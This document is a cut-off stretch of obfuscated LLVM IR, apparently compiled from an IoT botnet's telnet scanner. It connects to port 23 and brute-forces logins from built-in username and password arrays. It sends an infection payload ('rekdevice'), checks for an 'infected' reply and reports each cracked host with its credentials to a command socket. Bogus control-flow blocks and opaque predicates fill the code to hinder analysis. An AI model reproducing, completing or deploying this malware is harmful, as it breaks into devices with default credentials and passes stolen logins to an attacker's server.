  %1246 = sext i32 %1245 to i64
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1246
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1247, i32 0, i32 0
  %1249 = load i32, i32* %1248, align 16
  %1250 = call i32 @sclose(i32 %1249)
  %1251 = load i32, i32* %5, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 2
  store i8 0, i8* %1254, align 8
  %1255 = load i32, i32* %5, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 3
  store i8 1, i8* %1258, align 1
  %1259 = load i32, i32* @x.85
  %1260 = load i32, i32* @y.86
  %1261 = sub i32 %1259, 1
  %1262 = mul i32 %1259, %1261
  %1263 = urem i32 %1262, 2
  %1264 = icmp eq i32 %1263, 0
  %1265 = icmp slt i32 %1260, 10
  %1266 = or i1 %1264, %1265
  br i1 %1266, label %originalBBpart2189, label %originalBB187alteredBB

originalBBpart2189:                               ; preds = %originalBB187
  br label %1449

; <label>:1267:                                   ; preds = %1228
  %1268 = load i32, i32* %5, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 0
  %1272 = load i32, i32* %1271, align 16
  %1273 = load i32, i32* %3, align 4
  %1274 = load i32, i32* %5, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 9
  %1278 = load i8*, i8** %1277, align 8
  %1279 = call i32 @read_until_response(i32 %1272, i32 %1273, i8* %1278, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @legit, i32 0, i32 0))
  %1280 = icmp ne i32 %1279, 0
  br i1 %1280, label %1281, label %1431

; <label>:1281:                                   ; preds = %1267
  %1282 = load i32, i32* %5, align 4
  %1283 = sext i32 %1282 to i64
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1283
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1284, i32 0, i32 0
  %1286 = load i32, i32* %1285, align 16
  %1287 = load i8*, i8** @rekdevice, align 8
  %1288 = load i8*, i8** @rekdevice, align 8
  %1289 = call i64 @strlen(i8* %1288) #10
  %1290 = call i64 @send(i32 %1286, i8* %1287, i64 %1289, i32 16384)
  %1291 = icmp sgt i64 %1290, 0
  br i1 %1291, label %1292, label %1312

; <label>:1292:                                   ; preds = %1281
  %1293 = load i32, i32* @x.85
  %1294 = load i32, i32* @y.86
  %1295 = sub i32 %1293, 1
  %1296 = mul i32 %1293, %1295
  %1297 = urem i32 %1296, 2
  %1298 = icmp eq i32 %1297, 0
  %1299 = icmp slt i32 %1294, 10
  %1300 = or i1 %1298, %1299
  br i1 %1300, label %originalBB191, label %originalBB191alteredBB

originalBB191:                                    ; preds = %originalBB191alteredBB, %1292
  %1301 = load i32, i32* %5, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1302
  call void @reset_telstate(%struct.telstate_t* %1303)
  %1304 = load i32, i32* @x.85
  %1305 = load i32, i32* @y.86
  %1306 = sub i32 %1304, 1
  %1307 = mul i32 %1304, %1306
  %1308 = urem i32 %1307, 2
  %1309 = icmp eq i32 %1308, 0
  %1310 = icmp slt i32 %1305, 10
  %1311 = or i1 %1309, %1310
  br i1 %1311, label %originalBBpart2193, label %originalBB191alteredBB

originalBBpart2193:                               ; preds = %originalBB191
  br label %1312

; <label>:1312:                                   ; preds = %originalBBpart2193, %1281
  %1313 = call i32 @sleep(i32 20)
  %1314 = load i32, i32* %5, align 4
  %1315 = sext i32 %1314 to i64
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1315
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1316, i32 0, i32 0
  %1318 = load i32, i32* %1317, align 16
  %1319 = load i32, i32* %3, align 4
  %1320 = load i32, i32* %5, align 4
  %1321 = sext i32 %1320 to i64
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1321
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1322, i32 0, i32 9
  %1324 = load i8*, i8** %1323, align 8
  %1325 = call i32 @read_until_response(i32 %1318, i32 %1319, i8* %1324, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @infected, i32 0, i32 0))
  %1326 = icmp ne i32 %1325, 0
  br i1 %1326, label %1327, label %1353

; <label>:1327:                                   ; preds = %1312
  %1328 = load i32, i32* @mainCommSock, align 4
  %1329 = load i32, i32* %5, align 4
  %1330 = sext i32 %1329 to i64
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1330
  %1332 = call i8* @get_telstate_host(%struct.telstate_t* %1331)
  %1333 = load i32, i32* %5, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1335, i32 0, i32 4
  %1337 = load i8, i8* %1336, align 2
  %1338 = zext i8 %1337 to i64
  %1339 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %1338
  %1340 = load i8*, i8** %1339, align 8
  %1341 = load i32, i32* %5, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 5
  %1345 = load i8, i8* %1344, align 1
  %1346 = zext i8 %1345 to i64
  %1347 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %1346
  %1348 = load i8*, i8** %1347, align 8
  %1349 = call i32 (i32, i8*, ...) @sockprintf(i32 %1328, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.321, i32 0, i32 0), i8* %1332, i8* %1340, i8* %1348)
  %1350 = load i32, i32* %5, align 4
  %1351 = sext i32 %1350 to i64
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1351
  call void @reset_telstate(%struct.telstate_t* %1352)
  br label %1449

; <label>:1353:                                   ; preds = %1312
  %1354 = load i32, i32* @x.85
  %1355 = load i32, i32* @y.86
  %1356 = sub i32 %1354, 1
  %1357 = mul i32 %1354, %1356
  %1358 = urem i32 %1357, 2
  %1359 = icmp eq i32 %1358, 0
  %1360 = icmp slt i32 %1355, 10
  %1361 = or i1 %1359, %1360
  br i1 %1361, label %originalBB195, label %originalBB195alteredBB

originalBB195:                                    ; preds = %originalBB195alteredBB, %1353
  %1362 = load i32, i32* %5, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1363
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1364, i32 0, i32 7
  %1366 = load i32, i32* %1365, align 16
  %1367 = add i32 %1366, 60
  %1368 = zext i32 %1367 to i64
  %1369 = call i64 @time(i64* null) #2
  %1370 = icmp slt i64 %1368, %1369
  %1371 = load i32, i32* @x.85
  %1372 = load i32, i32* @y.86
  %1373 = sub i32 %1371, 1
  %1374 = mul i32 %1371, %1373
  %1375 = urem i32 %1374, 2
  %1376 = icmp eq i32 %1375, 0
  %1377 = icmp slt i32 %1372, 10
  %1378 = or i1 %1376, %1377
  br i1 %1378, label %originalBBpart2211, label %originalBB195alteredBB

originalBBpart2211:                               ; preds = %originalBB195
  br i1 %1370, label %1379, label %1430

; <label>:1379:                                   ; preds = %originalBBpart2211
  %1380 = load i32, i32* @x.85
  %1381 = load i32, i32* @y.86
  %1382 = sub i32 %1380, 1
  %1383 = mul i32 %1380, %1382
  %1384 = urem i32 %1383, 2
  %1385 = icmp eq i32 %1384, 0
  %1386 = icmp slt i32 %1381, 10
  %1387 = or i1 %1385, %1386
  br i1 %1387, label %originalBB213, label %originalBB213alteredBB

originalBB213:                                    ; preds = %originalBB213alteredBB, %1379
  %1388 = load i32, i32* %5, align 4
  %1389 = sext i32 %1388 to i64
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1389
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1390, i32 0, i32 3
  %1392 = load i8, i8* %1391, align 1
  %1393 = zext i8 %1392 to i32
  %1394 = icmp ne i32 %1393, 3
  %1395 = load i32, i32* @x.85
  %1396 = load i32, i32* @y.86
  %1397 = sub i32 %1395, 1
  %1398 = mul i32 %1395, %1397
  %1399 = urem i32 %1398, 2
  %1400 = icmp eq i32 %1399, 0
  %1401 = icmp slt i32 %1396, 10
  %1402 = or i1 %1400, %1401
  br i1 %1402, label %originalBBpart2215, label %originalBB213alteredBB

originalBBpart2215:                               ; preds = %originalBB213
  br i1 %1394, label %1403, label %1426

; <label>:1403:                                   ; preds = %originalBBpart2215
  %1404 = load i32, i32* @mainCommSock, align 4
  %1405 = load i32, i32* %5, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1406
  %1408 = call i8* @get_telstate_host(%struct.telstate_t* %1407)
  %1409 = load i32, i32* %5, align 4
  %1410 = sext i32 %1409 to i64
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1410
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1411, i32 0, i32 4
  %1413 = load i8, i8* %1412, align 2
  %1414 = zext i8 %1413 to i64
  %1415 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %1414
  %1416 = load i8*, i8** %1415, align 8
  %1417 = load i32, i32* %5, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1418
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1419, i32 0, i32 5
  %1421 = load i8, i8* %1420, align 1
  %1422 = zext i8 %1421 to i64
  %1423 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %1422
  %1424 = load i8*, i8** %1423, align 8
  %1425 = call i32 (i32, i8*, ...) @sockprintf(i32 %1404, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.322, i32 0, i32 0), i8* %1408, i8* %1416, i8* %1424)
  br label %1426

; <label>:1426:                                   ; preds = %1403, %originalBBpart2215
  %1427 = load i32, i32* %5, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1428
  call void @reset_telstate(%struct.telstate_t* %1429)
  br label %1430

; <label>:1430:                                   ; preds = %1426, %originalBBpart2211
  br label %1431

; <label>:1431:                                   ; preds = %1430, %1267
  br label %1432

; <label>:1432:                                   ; preds = %1431, %originalBBpart2173, %898, %824, %originalBBpart2131, %originalBBpart2111, %559, %348, %139
  %1433 = load i32, i32* @x.85
  %1434 = load i32, i32* @y.86
  %1435 = sub i32 %1433, 1
  %1436 = mul i32 %1433, %1435
  %1437 = urem i32 %1436, 2
  %1438 = icmp eq i32 %1437, 0
  %1439 = icmp slt i32 %1434, 10
  %1440 = or i1 %1438, %1439
  br i1 %1440, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1432
  %1441 = load i32, i32* @x.85
  %1442 = load i32, i32* @y.86
  %1443 = sub i32 %1441, 1
  %1444 = mul i32 %1441, %1443
  %1445 = urem i32 %1444, 2
  %1446 = icmp eq i32 %1445, 0
  %1447 = icmp slt i32 %1442, 10
  %1448 = or i1 %1446, %1447
  br i1 %1448, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %1449

; <label>:1449:                                   ; preds = %originalBBpart2219, %1327, %originalBBpart2189, %1213, %1190, %originalBBpart2181, %1096, %1034, %894, %originalBBpart2139, %793, %originalBBpart2127, %originalBBpart2119, %606, %492, %472, %294, %originalBBpart216, %202
  %1450 = load i32, i32* %5, align 4
  %1451 = add nsw i32 %1450, 1
  store i32 %1451, i32* %5, align 4
  br label %89

; <label>:1452:                                   ; preds = %originalBBpart24
  br label %87

originalBBalteredBB:                              ; preds = %originalBB, %26
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %89
  %1453 = load i32, i32* %5, align 4
  %1454 = load i32, i32* %11, align 4
  %1455 = icmp slt i32 %1453, %1454
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %109
  %1456 = load i32, i32* %5, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 7
  %1460 = load i32, i32* %1459, align 16
  %1461 = icmp eq i32 %1460, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %207
  %1462 = load i32, i32* %5, align 4
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 4
  %1466 = load i8, i8* %1465, align 2
  %1467 = zext i8 %1466 to i64
  %1468 = icmp eq i64 %1467, 99
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %231
  %1469 = load i32, i32* %5, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 3
  store i8 1, i8* %1472, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %254
  %1473 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %1473, align 4
  %1474 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1475 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %1474, i16* %1475, align 2
  %1476 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %1477 = getelementptr inbounds [8 x i8], [8 x i8]* %1476, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1477, i8 0, i64 8, i32 4, i1 false)
  %1478 = load i32, i32* %5, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1479
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1480, i32 0, i32 1
  %1482 = load i32, i32* %1481, align 4
  %1483 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %1484 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1483, i32 0, i32 0
  store i32 %1482, i32* %1484, align 4
  %1485 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %1486 = load i32, i32* %5, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 0
  store i32 %1485, i32* %1489, align 16
  %1490 = load i32, i32* %5, align 4
  %1491 = sext i32 %1490 to i64
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1491
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1492, i32 0, i32 0
  %1494 = load i32, i32* %1493, align 16
  %1495 = icmp eq i32 %1494, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %324
  %1496 = load i32, i32* %5, align 4
  %1497 = sext i32 %1496 to i64
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1497
  call void @reset_telstate(%struct.telstate_t* %1498)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %349
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %375
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %392
  %1499 = load i32, i32* %5, align 4
  %1500 = sext i32 %1499 to i64
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1500
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1501, i32 0, i32 0
  %1503 = load i32, i32* %1502, align 16
  %_ = sub i32 %1503, 64
  %gen = mul i32 %_, 64
  %_35 = shl i32 %1503, 64
  %_36 = sub i32 %1503, 64
  %gen37 = mul i32 %_36, 64
  %_38 = sub i32 %1503, 64
  %gen39 = mul i32 %_38, 64
  %_40 = sub i32 %1503, 64
  %gen41 = mul i32 %_40, 64
  %_42 = shl i32 %1503, 64
  %_43 = sub i32 %1503, 64
  %gen44 = mul i32 %_43, 64
  %1504 = srem i32 %1503, 64
  %1505 = zext i32 %1504 to i64
  %_45 = sub i64 1, %1505
  %gen46 = mul i64 %_45, %1505
  %_47 = sub i64 0, 1
  %gen48 = add i64 %_47, %1505
  %_49 = shl i64 1, %1505
  %_50 = sub i64 1, %1505
  %gen51 = mul i64 %_50, %1505
  %_52 = sub i64 0, 1
  %gen53 = add i64 %_52, %1505
  %1506 = shl i64 1, %1505
  %1507 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %1508 = load i32, i32* %5, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 0
  %1512 = load i32, i32* %1511, align 16
  %_54 = shl i32 %1512, 64
  %_55 = shl i32 %1512, 64
  %_56 = sub i32 0, %1512
  %gen57 = add i32 %_56, 64
  %_58 = sub i32 %1512, 64
  %gen59 = mul i32 %_58, 64
  %_60 = sub i32 %1512, 64
  %gen61 = mul i32 %_60, 64
  %_62 = shl i32 %1512, 64
  %_63 = sub i32 %1512, 64
  %gen64 = mul i32 %_63, 64
  %1513 = sdiv i32 %1512, 64
  %1514 = sext i32 %1513 to i64
  %1515 = getelementptr inbounds [16 x i64], [16 x i64]* %1507, i64 0, i64 %1514
  %1516 = load i64, i64* %1515, align 8
  %_65 = sub i64 0, %1516
  %gen66 = add i64 %_65, %1506
  %_67 = shl i64 %1516, %1506
  %_68 = sub i64 0, %1516
  %gen69 = add i64 %_68, %1506
  %1517 = or i64 %1516, %1506
  store i64 %1517, i64* %1515, align 8
  %1518 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %1518, align 8
  %1519 = load i32, i32* %3, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %1520, i64* %1521, align 8
  %1522 = load i32, i32* %5, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 0
  %1526 = load i32, i32* %1525, align 16
  %_70 = sub i32 0, %1526
  %gen71 = add i32 %_70, 1
  %_72 = shl i32 %1526, 1
  %_73 = sub i32 %1526, 1
  %gen74 = mul i32 %_73, 1
  %_75 = shl i32 %1526, 1
  %_76 = shl i32 %1526, 1
  %1527 = add nsw i32 %1526, 1
  %1528 = call i32 @select(i32 %1527, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %1528, i32* %6, align 4
  %1529 = load i32, i32* %6, align 4
  %1530 = icmp eq i32 %1529, 1
  br label %originalBB34

originalBB80alteredBB:                            ; preds = %originalBB80, %473
  %1531 = load i32, i32* %6, align 4
  %1532 = icmp eq i32 %1531, -1
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %496
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %513
  %1533 = load i32, i32* %5, align 4
  %1534 = sext i32 %1533 to i64
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1534
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1535, i32 0, i32 7
  %1537 = load i32, i32* %1536, align 16
  %_89 = shl i32 %1537, 5
  %_90 = sub i32 0, %1537
  %gen91 = add i32 %_90, 5
  %_92 = shl i32 %1537, 5
  %_93 = sub i32 %1537, 5
  %gen94 = mul i32 %_93, 5
  %_95 = sub i32 %1537, 5
  %gen96 = mul i32 %_95, 5
  %_97 = shl i32 %1537, 5
  %1538 = add i32 %1537, 5
  %1539 = zext i32 %1538 to i64
  %1540 = call i64 @time(i64* null) #2
  %1541 = icmp slt i64 %1539, %1540
  br label %originalBB88

originalBB101alteredBB:                           ; preds = %originalBB101, %539
  %1542 = load i32, i32* %5, align 4
  %1543 = sext i32 %1542 to i64
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1543
  call void @reset_telstate(%struct.telstate_t* %1544)
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %574
  %1545 = load i32, i32* %5, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 9
  %1549 = load i8*, i8** %1548, align 8
  %1550 = call i32 @contains_fail(i8* %1549)
  %1551 = icmp ne i32 %1550, 0
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %621
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %638
  %1552 = load i32, i32* %5, align 4
  %1553 = sext i32 %1552 to i64
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1553
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1554, i32 0, i32 0
  %1556 = load i32, i32* %1555, align 16
  %1557 = load i32, i32* %5, align 4
  %1558 = sext i32 %1557 to i64
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1558
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1559, i32 0, i32 4
  %1561 = load i8, i8* %1560, align 2
  %1562 = zext i8 %1561 to i64
  %1563 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %1562
  %1564 = load i8*, i8** %1563, align 8
  %1565 = load i32, i32* %5, align 4
  %1566 = sext i32 %1565 to i64
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1566
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1567, i32 0, i32 4
  %1569 = load i8, i8* %1568, align 2
  %1570 = zext i8 %1569 to i64
  %1571 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %1570
  %1572 = load i8*, i8** %1571, align 8
  %1573 = call i64 @strlen(i8* %1572) #10
  %1574 = call i64 @send(i32 %1556, i8* %1564, i64 %1573, i32 16384)
  %1575 = icmp slt i64 %1574, 0
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %679
  %1576 = load i32, i32* %5, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1577
  call void @reset_telstate(%struct.telstate_t* %1578)
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %699
  %1579 = load i32, i32* %5, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 0
  %1583 = load i32, i32* %1582, align 16
  %1584 = call i64 @send(i32 %1583, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %1585 = icmp slt i64 %1584, 0
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %723
  %1586 = load i32, i32* %5, align 4
  %1587 = sext i32 %1586 to i64
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1587
  call void @reset_telstate(%struct.telstate_t* %1588)
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %743
  %1589 = load i32, i32* %5, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1590
  call void @advance_telstate(%struct.telstate_t* %1591, i32 4)
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %804
  %1592 = load i32, i32* %5, align 4
  %1593 = sext i32 %1592 to i64
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1593
  call void @reset_telstate(%struct.telstate_t* %1594)
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %850
  %1595 = load i32, i32* %5, align 4
  %1596 = sext i32 %1595 to i64
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1596
  call void @reset_telstate(%struct.telstate_t* %1597)
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %870
  %1598 = load i32, i32* %5, align 4
  %1599 = sext i32 %1598 to i64
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1599
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1600, i32 0, i32 0
  %1602 = load i32, i32* %1601, align 16
  %1603 = call i64 @send(i32 %1602, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %1604 = icmp slt i64 %1603, 0
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %916
  %1605 = call i64 @time(i64* null) #2
  %1606 = trunc i64 %1605 to i32
  %1607 = load i32, i32* %5, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 7
  store i32 %1606, i32* %1610, align 16
  %1611 = load i32, i32* %5, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1613, i32 0, i32 9
  %1615 = load i8*, i8** %1614, align 8
  %1616 = call i32 @contains_fail(i8* %1615)
  %1617 = icmp ne i32 %1616, 0
  br label %originalBB145

originalBB149alteredBB:                           ; preds = %originalBB149, %950
  %1618 = load i32, i32* %5, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1619
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1620, i32 0, i32 9
  %1622 = load i8*, i8** %1621, align 8
  %1623 = call i32 @contains_success(i8* %1622)
  %1624 = icmp ne i32 %1623, 0
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %982
  %1625 = load i32, i32* %5, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1626
  call void @advance_telstate(%struct.telstate_t* %1627, i32 7)
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %1035
  %1628 = load i32, i32* %5, align 4
  %1629 = sext i32 %1628 to i64
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1629
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1630, i32 0, i32 7
  %1632 = load i32, i32* %1631, align 16
  %_158 = sub i32 %1632, 7
  %gen159 = mul i32 %_158, 7
  %_160 = sub i32 0, %1632
  %gen161 = add i32 %_160, 7
  %_162 = sub i32 %1632, 7
  %gen163 = mul i32 %_162, 7
  %_164 = sub i32 0, %1632
  %gen165 = add i32 %_164, 7
  %_166 = shl i32 %1632, 7
  %_167 = shl i32 %1632, 7
  %1633 = add i32 %1632, 7
  %1634 = zext i32 %1633 to i64
  %1635 = call i64 @time(i64* null) #2
  %1636 = icmp slt i64 %1634, %1635
  br label %originalBB157

originalBB171alteredBB:                           ; preds = %originalBB171, %1065
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %1111
  %1637 = load i32, i32* %5, align 4
  %1638 = sext i32 %1637 to i64
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1638
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1639, i32 0, i32 0
  %1641 = load i32, i32* %1640, align 16
  %1642 = call i64 @send(i32 %1641, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0), i64 8, i32 16384)
  %1643 = icmp slt i64 %1642, 0
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1135
